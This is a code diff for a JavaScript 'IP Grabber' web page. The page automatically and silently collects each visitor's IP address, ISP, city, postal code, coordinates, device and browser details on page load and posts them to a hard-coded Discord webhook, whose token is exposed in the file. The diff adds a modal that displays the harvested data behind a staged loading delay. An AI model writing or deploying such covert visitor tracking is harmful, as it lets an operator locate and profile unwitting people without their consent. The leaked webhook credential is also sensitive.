@@ -1,6 +1,41 @@
 // Discord Webhook URL - Replace with your actual webhook URL
 const DISCORD_WEBHOOK = 'https://discord.com/api/webhooks/1416742887722320062/-5WaLqKF3w21CGDp_q24eKtV8KXdP5e2_6ES2GAB8nyacoq_pn_cSj8kh98KXer1owjf';
 
+// Global variable to store user information
+let currentUserInfo = null;
+
+// Simple test function to open modal (for debugging)
+function testModal() {
+    console.log('Test modal function called');
+    const modal = document.getElementById('detailsModal');
+    const loading = document.getElementById('loading');
+    const userDetails = document.getElementById('userDetails');
+    
+    if (modal) {
+        modal.style.display = 'block';
+        loading.style.display = 'block';
+        userDetails.style.display = 'none';
+        console.log('Modal opened via test function');
+        
+        // If we have user info, show it after a delay
+        if (currentUserInfo) {
+            console.log('Using cached user info');
+            setTimeout(() => {
+                displayUserInfo();
+            }, 1500);
+        } else {
+            console.log('Grabbing user info...');
+            grabUserInfo().then(() => {
+                setTimeout(() => {
+                    displayUserInfo();
+                }, 2000);
+            });
+        }
+    } else {
+        console.error('Modal not found in test function');
+    }
+}
+
 // Function to get user's IP and device information
 async function grabUserInfo() {
     try {
@@ -53,6 +88,9 @@ async function grabUserInfo() {
             timestamp: timestamp,
             referrer: document.referrer || 'Direct visit'
         };
+        
+        // Store user info globally for modal display
+        currentUserInfo = userInfo;
         
         // Send to Discord webhook
         await sendToDiscord(userInfo);
@@ -160,35 +198,206 @@ async function sendErrorToDiscord(error) {
     }
 }
 
+// Modal functionality
+function initializeModal() {
+    console.log('Initializing modal...');
+    
+    const modal = document.getElementById('detailsModal');
+    const btn = document.getElementById('showDetailsBtn');
+    const closeBtn = document.querySelector('.close');
+    const loading = document.getElementById('loading');
+    const userDetails = document.getElementById('userDetails');
+
+    console.log('Modal elements found:', {
+        modal: !!modal,
+        btn: !!btn,
+        closeBtn: !!closeBtn,
+        loading: !!loading,
+        userDetails: !!userDetails
+    });
+
+    if (!modal || !btn || !closeBtn || !loading || !userDetails) {
+        console.error('Some modal elements not found!');
+        return;
+    }
+
+    // Show modal when button is clicked
+    btn.addEventListener('click', function(e) {
+        console.log('Button clicked!');
+        e.preventDefault();
+        
+        modal.style.display = 'block';
+        loading.style.display = 'block';
+        userDetails.style.display = 'none';
+        
+        console.log('Modal should be visible now');
+        
+        // If we don't have user info yet, grab it
+        if (!currentUserInfo) {
+            console.log('Grabbing user info...');
+            grabUserInfo().then(() => {
+                setTimeout(() => {
+                    displayUserInfo();
+                }, 2000); // Show loading for 2 seconds for effect
+            });
+        } else {
+            console.log('Using cached user info');
+            // If we already have info, show it after a brief loading
+            setTimeout(() => {
+                displayUserInfo();
+            }, 1500);
+        }
+    });
+
+    // Close modal when X is clicked
+    closeBtn.addEventListener('click', function(e) {
+        console.log('Close button clicked');
+        e.preventDefault();
+        modal.style.display = 'none';
+    });
+
+    // Close modal when clicking outside of it
+    window.addEventListener('click', function(event) {
+        if (event.target === modal) {
+            console.log('Clicked outside modal, closing');
+            modal.style.display = 'none';
+        }
+    });
+    
+    // Add a simple test click handler as backup
+    btn.onclick = function(e) {
+        console.log('Backup onclick handler triggered');
+        if (modal.style.display !== 'block') {
+            modal.style.display = 'block';
+            loading.style.display = 'block';
+            userDetails.style.display = 'none';
+        }
+    };
+    
+    console.log('Modal initialization complete');
+}
+
+function displayUserInfo() {
+    const loading = document.getElementById('loading');
+    const userDetails = document.getElementById('userDetails');
+    
+    if (!currentUserInfo) {
+        userDetails.innerHTML = '<p style="text-align: center; color: #666;">Unable to gather information. Please try again.</p>';
+    } else {
+        userDetails.innerHTML = `
+            <div class="detail-group">
+                <h3>🌐 Network Information</h3>
+                <div class="detail-item">
+                    <span class="detail-label">IP Address:</span>
+                    <span class="detail-value">${currentUserInfo.ip}</span>
+                </div>
+                <div class="detail-item">
+                    <span class="detail-label">ISP Provider:</span>
+                    <span class="detail-value">${currentUserInfo.isp}</span>
+                </div>
+            </div>
+            
+            <div class="detail-group">
+                <h3>📍 Location Details</h3>
+                <div class="detail-item">
+                    <span class="detail-label">Country:</span>
+                    <span class="detail-value">${currentUserInfo.country} (${currentUserInfo.countryCode})</span>
+                </div>
+                <div class="detail-item">
+                    <span class="detail-label">Region:</span>
+                    <span class="detail-value">${currentUserInfo.region}</span>
+                </div>
+                <div class="detail-item">
+                    <span class="detail-label">City:</span>
+                    <span class="detail-value">${currentUserInfo.city}</span>
+                </div>
+                <div class="detail-item">
+                    <span class="detail-label">Postal Code:</span>
+                    <span class="detail-value">${currentUserInfo.postal}</span>
+                </div>
+                <div class="detail-item">
+                    <span class="detail-label">Coordinates:</span>
+                    <span class="detail-value">${currentUserInfo.latitude}, ${currentUserInfo.longitude}</span>
+                </div>
+            </div>
+            
+            <div class="detail-group">
+                <h3>💻 Device Information</h3>
+                <div class="detail-item">
+                    <span class="detail-label">Platform:</span>
+                    <span class="detail-value">${currentUserInfo.platform}</span>
+                </div>
+                <div class="detail-item">
+                    <span class="detail-label">Screen Resolution:</span>
+                    <span class="detail-value">${currentUserInfo.screenWidth} x ${currentUserInfo.screenHeight}</span>
+                </div>
+                <div class="detail-item">
+                    <span class="detail-label">Color Depth:</span>
+                    <span class="detail-value">${currentUserInfo.screenColorDepth}-bit</span>
+                </div>
+                <div class="detail-item">
+                    <span class="detail-label">Language:</span>
+                    <span class="detail-value">${currentUserInfo.language}</span>
+                </div>
+                <div class="detail-item">
+                    <span class="detail-label">Timezone:</span>
+                    <span class="detail-value">${currentUserInfo.timezone}</span>
+                </div>
+            </div>
+            
+            <div class="detail-group">
+                <h3>🌐 Browser Information</h3>
+                <div class="detail-item">
+                    <span class="detail-label">User Agent:</span>
+                    <span class="detail-value">${currentUserInfo.userAgent}</span>
+                </div>
+                <div class="detail-item">
+                    <span class="detail-label">Cookies Enabled:</span>
+                    <span class="detail-value">${currentUserInfo.cookieEnabled ? 'Yes' : 'No'}</span>
+                </div>
+                <div class="detail-item">
+                    <span class="detail-label">Java Enabled:</span>
+                    <span class="detail-value">${currentUserInfo.javaEnabled ? 'Yes' : 'No'}</span>
+                </div>
+                <div class="detail-item">
+                    <span class="detail-label">Referrer:</span>
+                    <span class="detail-value">${currentUserInfo.referrer}</span>
+                </div>
+                <div class="detail-item">
+                    <span class="detail-label">Visit Time:</span>
+                    <span class="detail-value">${new Date(currentUserInfo.timestamp).toLocaleString()}</span>
+                </div>
+            </div>
+        `;
+    }
+    
+    loading.style.display = 'none';
+    userDetails.style.display = 'block';
+}
+
 // Automatically grab user info when the page loads
 document.addEventListener('DOMContentLoaded', function() {
     console.log('IP Grabber loaded successfully');
     
-    // Add a small delay to ensure the page is fully loaded
+    // Add a small delay to ensure all elements are loaded
     setTimeout(() => {
+        // Initialize modal functionality
+        initializeModal();
+        
+        // Grab user info silently in background
         grabUserInfo();
-    }, 1000);
+    }, 500);
 });
 
-// Optional: Add a manual trigger button (you can remove this if not needed)
-function addManualTrigger() {
-    const button = document.createElement('button');
-    button.textContent = 'Refresh Info';
-    button.style.cssText = `
-        position: fixed;
-        bottom: 20px;
-        right: 20px;
-        padding: 10px 15px;
-        background: #333;
-        color: white;
-        border: none;
-        border-radius: 5px;
-        cursor: pointer;
-        z-index: 9999;
-    `;
-    button.onclick = grabUserInfo;
-    document.body.appendChild(button);
+// Backup initialization in case DOMContentLoaded already fired
+if (document.readyState === 'loading') {
+    // Document is still loading
+} else {
+    // Document has finished loading
+    setTimeout(() => {
+        initializeModal();
+        if (!currentUserInfo) {
+            grabUserInfo();
+        }
+    }, 100);
 }
-
-// Uncomment the line below if you want a manual refresh button
-// addManualTrigger();
